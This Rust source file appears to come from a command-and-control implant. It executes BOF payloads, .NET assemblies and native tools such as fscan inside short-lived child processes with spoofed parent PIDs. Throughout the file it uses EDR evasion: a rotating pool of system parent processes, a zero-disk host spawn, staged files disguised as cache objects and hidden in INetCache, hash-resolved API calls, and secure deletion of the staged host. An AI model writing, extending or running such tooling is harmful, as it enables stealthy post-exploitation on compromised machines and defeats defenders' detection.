//! Isolated BOF/.NET execution via PPID-spoofed sacrificial host.
//!
//! Agent does **not** run BOF/CLR in-process. It:
//! 1. Stages short-lived host PE (random name under cache/local dir — **must** land briefly for CreateProcess)
//! 2. CreateProcess with rotating parent spoof + stdin/stdout pipes
//! 3. Writes job frame (seed-derived magic), result back over pipe; BOF/.NET payload stays **in memory on the pipe**
//! 4. Deletes host PE after exit
//!
//! Note: the **host EXE** is not zero-disk (CreateProcess needs a path); the **BOF/assembly body** is not written to disk.

use crate::types::CommandResult;
use crate::wire_ids::JOB_MAGIC;
use log::info;
use std::path::PathBuf;

pub const MOD_ISO_HOST: &str = "iso_host";
const KIND_BOF: u32 = 1;
const KIND_DOTNET: u32 = 2;

/// Execute BOF in isolated host (Windows).
#[cfg(windows)]
pub async fn run_bof_isolated(coff: &[u8], args: &[u8]) -> CommandResult {
    match run_job(KIND_BOF, coff, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated bof: {e}"),
            path: None,
            req_id: None,
        },
    }
}

/// Execute .NET assembly in isolated host (Windows).
#[cfg(windows)]
pub async fn run_dotnet_isolated(assembly: &[u8], args: &[String]) -> CommandResult {
    let args_raw = serde_json::to_vec(args).unwrap_or_default();
    match run_job(KIND_DOTNET, assembly, &args_raw).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated dotnet: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_bof_isolated(_coff: &[u8], _args: &[u8]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(not(windows))]
pub async fn run_dotnet_isolated(_assembly: &[u8], _args: &[String]) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated exec: windows only".into(),
        path: None,
        req_id: None,
    }
}

/// Run a native PE (e.g. fscan.exe) in a PPID-spoofed short-lived process.
/// Writes PE to TEMP, CreateProcess with args, captures stdout/stderr, deletes file.
#[cfg(windows)]
pub async fn run_native_isolated(pe: &[u8], args: &str) -> CommandResult {
    match run_native_job(pe, args).await {
        Ok((o, e)) => CommandResult {
            stdout: o,
            stderr: e,
            path: None,
            req_id: None,
        },
        Err(e) => CommandResult {
            stdout: String::new(),
            stderr: format!("isolated native: {e}"),
            path: None,
            req_id: None,
        },
    }
}

#[cfg(not(windows))]
pub async fn run_native_isolated(_pe: &[u8], _args: &str) -> CommandResult {
    CommandResult {
        stdout: String::new(),
        stderr: "isolated native: windows only".into(),
        path: None,
        req_id: None,
    }
}

#[cfg(windows)]
async fn run_native_job(pe: &[u8], args: &str) -> Result<(String, String), String> {
    tokio::task::yield_now().await;
    crate::utils::opsec_heavy_pace_async().await;
    if pe.len() < 64 || pe[0] != b'M' || pe[1] != b'Z' {
        return Err("payload is not a PE (MZ missing)".into());
    }
    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    let cmdline = if args.trim().is_empty() {
        format!("\"{}\"", path_str)
    } else {
        format!("\"{}\" {}", path_str, args.trim())
    };

    let parent = pick_parent_image();
    let child = match crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent) {
        Ok(c) => {
            info!("[iso-native] pid={}", c.pid);
            c
        }
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            return Err(format!("spawn failed: {e}"));
        }
    };

    // Native PE: no CIS1 on stdin — close write end so child sees EOF on stdin
    let _ = crate::native::close_handle(child.stdin_write);

    // Spawn blocking to avoid stalling the async runtime during long-running native PEs (e.g. fscan)
    let stdout_read = child.stdout_read;
    let h_process = child.h_process;
    let out_buf = tokio::task::spawn_blocking(move || {
        let buf = crate::native::pipe_read_to_end(stdout_read);
        let _ = crate::native::wait_for_single_object(h_process);
        buf
    })
    .await
    .map_err(|e| format!("spawn blocking failed: {e}"))?;

    let _ = crate::native::close_handle(child.stdout_read);
    let _ = crate::native::close_handle(child.h_process);

    let _ = std::fs::write(&path, b"");
    let _ = std::fs::remove_file(&path);

    // Hybrid decode for GBK console tools like fscan
    let text = {
        #[cfg(feature = "encoding-support")]
        {
            if std::str::from_utf8(&out_buf).is_err() {
                let (cow, _, _) = encoding_rs::GBK.decode(&out_buf);
                cow.into_owned()
            } else {
                String::from_utf8_lossy(&out_buf).into_owned()
            }
        }
        #[cfg(not(feature = "encoding-support"))]
        {
            String::from_utf8_lossy(&out_buf).into_owned()
        }
    };
    Ok((text, String::new()))
}

#[cfg(windows)]
async fn run_job(kind: u32, payload: &[u8], args: &[u8]) -> Result<(String, String), String> {
    // Yield so async callers don't block the runtime exclusively forever
    tokio::task::yield_now().await;
    // Avoid back-to-back BOF/.NET process-create bursts (EDR process tree heuristics)
    crate::utils::opsec_heavy_pace_async().await;

    let pe = resolve_iso_host_pe()?;
    let parent = pick_parent_image();

    // Prefer true zero-residual host (section / delete-on-close). Fall back to classic temp.
    let (child, disk_path) = spawn_isolated_host(&pe, parent)?;
    info!("[iso] host pid={}", child.pid);

    // Job frame: seed-derived magic + kind + lens + body (payload never written as a file)
    let mut frame = Vec::with_capacity(16 + payload.len() + args.len());
    frame.extend_from_slice(&JOB_MAGIC);
    frame.extend_from_slice(&kind.to_le_bytes());
    frame.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    frame.extend_from_slice(&(args.len() as u32).to_le_bytes());
    frame.extend_from_slice(payload);
    frame.extend_from_slice(args);

    let write_res = crate::native::pipe_write_all(child.stdin_write, &frame);
    let _ = crate::native::close_handle(child.stdin_write);
    if let Err(e) = write_res {
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&disk_path);
        return Err(e);
    }

    // Read result header
    let hdr = match crate::native::pipe_read_exact(child.stdout_read, 8) {
        Ok(h) => h,
        Err(e) => {
            let _ = crate::native::close_handle(child.stdout_read);
            let _ = crate::native::wait_for_single_object(child.h_process);
            let _ = crate::native::close_handle(child.h_process);
            burn_disk_path(&disk_path);
            return Err(e);
        }
    };
    let out_len = u32::from_le_bytes([hdr[0], hdr[1], hdr[2], hdr[3]]) as usize;
    let err_len = u32::from_le_bytes([hdr[4], hdr[5], hdr[6], hdr[7]]) as usize;
    if out_len > 32 * 1024 * 1024 || err_len > 8 * 1024 * 1024 {
        let _ = crate::native::close_handle(child.stdout_read);
        let _ = crate::native::close_handle(child.h_process);
        burn_disk_path(&disk_path);
        return Err("result too large".into());
    }
    let out_b = crate::native::pipe_read_exact(child.stdout_read, out_len).unwrap_or_default();
    let err_b = crate::native::pipe_read_exact(child.stdout_read, err_len).unwrap_or_default();
    let _ = crate::native::close_handle(child.stdout_read);

    // Wait exit (short timeout via WaitForSingleObject - use native wait)
    let _ = crate::native::wait_for_single_object(child.h_process);
    let _ = crate::native::close_handle(child.h_process);

    burn_disk_path(&disk_path);

    Ok((
        String::from_utf8_lossy(&out_b).into_owned(),
        String::from_utf8_lossy(&err_b).into_owned(),
    ))
}

/// Spawn host PE: zero-disk (x64) → classic temp file fallback.
/// Returns (child, optional residual path that must be burned if Some).
#[cfg(windows)]
fn spawn_isolated_host(
    pe: &[u8],
    parent: &str,
) -> Result<(crate::native::spawn::SpoofedPipedChild, Option<PathBuf>), String> {
    #[cfg(target_arch = "x86_64")]
    {
        match crate::native::ghost_host::spawn_host_zero_disk(pe, parent) {
            Ok(c) => return Ok((c, None)),
            Err(e) => {
                info!("[iso] zero-disk host failed ({e}), falling back to temp stage");
            }
        }
    }
    let path = write_temp_host(pe)?;
    let path_str = path.to_string_lossy().to_string();
    match crate::native::spawn::spawn_spoofed_piped_result(&path_str, parent) {
        Ok(c) => Ok((c, Some(path))),
        Err(e) => {
            let _ = std::fs::remove_file(&path);
            Err(format!("spawn failed: {e}"))
        }
    }
}

fn burn_disk_path(path: &Option<PathBuf>) {
    if let Some(p) = path {
        let _ = std::fs::write(p, b"");
        let _ = std::fs::remove_file(p);
    }
}

fn pick_parent_image() -> &'static str {
    // Rotate preferred parent; spawn layer still falls back across the pool.
    const POOL: &[&str] = &[
        "RuntimeBroker.exe",
        "sihost.exe",
        "taskhostw.exe",
        "svchost.exe",
        "explorer.exe",
        "dllhost.exe",
    ];
    let i = (crate::utils::next_u32_secure() as usize) % POOL.len();
    POOL[i]
}

fn resolve_iso_host_pe() -> Result<Vec<u8>, String> {
    // 1) Staged as module payload (not LoadLibrary — host PE)
    #[cfg(feature = "module-loader")]
    {
        if let Some(pe) = crate::module_loader::registry().get_host_pe(MOD_ISO_HOST) {
            if pe.len() > 64 && pe[0] == b'M' && pe[1] == b'Z' {
                return Ok(pe);
            }
        }
    }
    // 2) Beside agent / cwd — neutral filenames only (no product brand)
    let mut candidates = Vec::new();
    if let Ok(exe) = std::env::current_exe() {
        if let Some(dir) = exe.parent() {
            candidates.push(dir.join("host_helper.exe"));
            candidates.push(dir.join("runtime_host.exe"));
            candidates.push(dir.join("iso_host.exe"));
        }
    }
    candidates.push(PathBuf::from("host_helper.exe"));
    candidates.push(PathBuf::from("iso_host.exe"));
    for p in candidates {
        if let Ok(b) = std::fs::read(&p) {
            if b.len() > 64 && b[0] == b'M' && b[1] == b'Z' {
                return Ok(b);
            }
        }
    }
    Err("host runtime missing: stage module id=iso_host first".into())
}

/// Brief on-disk host PE for CreateProcess (payload job body stays on the pipe only).
fn write_temp_host(pe: &[u8]) -> Result<PathBuf, String> {
    let dir = host_staging_dir();
    let _ = std::fs::create_dir_all(&dir);
    // Look like a cache object, not a product name
    let a = crate::utils::next_u32_secure();
    let b = crate::utils::next_u32_secure();
    let name = format!("~DF{:08X}{:04X}.tmp", a, (b & 0xffff) as u32);
    let path = dir.join(name);
    std::fs::write(&path, pe).map_err(|e| format!("stage host: {e}"))?;
    // Best-effort hide (Windows)
    #[cfg(windows)]
    {
        use std::os::windows::ffi::OsStrExt;
        let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
        unsafe {
            // FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_TEMPORARY = 0x2 | 0x100
            type SetFileAttributesWFn = unsafe extern "system" fn(*const u16, u32) -> i32;
            let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
            if let Some(addr) =
                crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"SetFileAttributesW"))
            {
                let f: SetFileAttributesWFn = std::mem::transmute(addr);
                let _ = f(wide.as_ptr(), 0x0000_0102);
            }
        }
    }
    Ok(path)
}

fn host_staging_dir() -> PathBuf {
    // Prefer per-user cache over world-readable %TEMP% when available
    if let Ok(local) = std::env::var("LOCALAPPDATA") {
        return PathBuf::from(local)
            .join("Microsoft")
            .join("Windows")
            .join("INetCache");
    }
    if let Ok(xdg) = std::env::var("XDG_CACHE_HOME") {
        return PathBuf::from(xdg).join("fontconfig");
    }
    std::env::temp_dir()
}
